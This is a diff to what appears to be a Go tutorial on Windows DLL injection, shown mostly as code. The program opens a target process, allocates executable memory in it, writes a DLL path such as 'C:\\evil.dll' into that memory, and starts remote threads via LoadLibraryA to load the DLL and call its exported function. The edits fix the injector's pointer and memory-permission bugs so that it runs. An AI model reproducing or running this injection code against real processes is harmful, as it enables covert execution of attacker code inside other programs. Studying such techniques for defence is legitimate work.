@@ -349,7 +349,7 @@ const (
 )
 
 var (
-	targetDll          = "C:\\evil.dll"
+	targetDll          = "C:\\\\evil.dll"
 	dllLength          = len(targetDll)
 	kernel32           = syscall.NewLazyDLL("kernel32.dll")
 	loadLibraryA       = kernel32.NewProc("LoadLibraryA")
@@ -566,7 +566,9 @@ rundll32 c:\\gob-server.dll,GobServer
 
 **Freds, I mead threads... and some memory address calculation trick fuckery.**  
 
-```go  
+- example-4.go  
+
+```go
 package main
 
 import (
@@ -592,7 +594,7 @@ const (
 )
 
 var (
-	targetDll          = "C:\\gob-server.dll"
+	targetDll          = "C:\\\\gob-server.dll"
 	dllLength          = len(targetDll)
 	kernel32           = syscall.NewLazyDLL("kernel32.dll")
 	loadLibraryA       = kernel32.NewProc("LoadLibraryA")
@@ -616,7 +618,7 @@ func main() {
 		fmt.Println("Invalid PID:", os.Args[1])
 		return
 	}
-	fmt.Printf("PID: %d\n", pid)
+	fmt.Printf("PID: %#x\n", pid)
 
 	functionName := "GobServer"
 
@@ -625,7 +627,6 @@ func main() {
 		fmt.Println("Failed to load DLL:", err)
 		return
 	}
-	// dllHandle, err := syscall.BytePtrFromString(targetDll)
 
 	fmt.Printf("DLL Handle: %#x\n", dllHandle)
 
@@ -640,8 +641,8 @@ func main() {
 	offset := uintptr(functionAddress) - uintptr(unsafe.Pointer(dllHandle))
 
 	fmt.Printf("DLL Base Address: %#x\n", uintptr(unsafe.Pointer(dllHandle)))
-	fmt.Printf("Function Offset: %#x\n", offset)
 	fmt.Printf("Function Address: %#x\n", functionAddress)
+	fmt.Printf("Function Offset: %#x\n", offset)
 
 	// open process
 	ph, op2, err := openProcess.Call(
@@ -667,7 +668,7 @@ func main() {
 		0,
 		uintptr(uintptr(dllLength)*2),
 		uintptr(MEM_RESERVE|MEM_COMMIT),
-		uintptr(PAGE_READ_WRITE),
+		uintptr(PAGE_EXECUTE_READWRITE),
 	)
 	if err != nil {
 		fmt.Println("Results of virtualAllocEx:", err)
@@ -685,10 +686,12 @@ func main() {
 		MEM_RELEASE,
 	)
 
+	// write dll to memory
+	dllPtr, err := syscall.BytePtrFromString(targetDll)
 	wp1, wp2, err := writeProcessMemory.Call(
 		ph,
 		rb,
-		uintptr(unsafe.Pointer(dllHandle)),
+		uintptr(unsafe.Pointer(dllPtr)),
 		uintptr(dllLength),
 		0,
 	)
@@ -699,7 +702,7 @@ func main() {
 	fmt.Printf("wp1: %#x\n", wp1)
 	fmt.Printf("wp2: %#x\n", wp2)
 
-	// start new thread - Load the dll
+	// start new thread to load our dll
 	crt1, crt2, err := createRemoteThread.Call(
 		ph,
 		0,
@@ -710,12 +713,24 @@ func main() {
 		0,
 	)
 	if err != nil {
-		fmt.Println("Results of createRemoteThread:", err)
+		fmt.Println("Results of createRemoteThread-1:", err)
 	}
 	fmt.Printf("crt1: %#x\n", crt1)
 	fmt.Printf("crt2: %#x\n", crt2)
 
-	// start new thread - call the exported function of the dll
+	// This will keep the golang script alive... if that's what you want.
+	// wfso, err := syscall.WaitForSingleObject(syscall.Handle(foo), syscall.INFINITE)
+	// if err != nil {
+	// 	fmt.Println("Results of WaitForSingleObject", err)
+	// }
+	// fmt.Println(wfso)
+
+	fmt.Println("\n--- Additional Logging ---")
+	fmt.Println("targetDll:", targetDll)
+	fmt.Println("dllLength:", dllLength)
+	fmt.Printf("dllPtr: %#x\n", uintptr(unsafe.Pointer(dllPtr)))
+
+	// start new thread
 	crt3, crt4, err := createRemoteThread.Call(
 		ph,
 		0,
@@ -731,12 +746,7 @@ func main() {
 	fmt.Printf("crt3: %#x\n", crt3)
 	fmt.Printf("crt4: %#x\n", crt4)
 
-	fmt.Println("\n--- Additional Logging ---")
-	fmt.Println("targetDll:", targetDll)
-	fmt.Println("dllLength:", dllLength)
-	fmt.Printf("dllPtr: %#x\n", uintptr(unsafe.Pointer(dllPtr)))
-
-	fmt.Println("Exported DLL Function called successfully")
+	fmt.Println("Function called successfully")
 }
 ```  
 
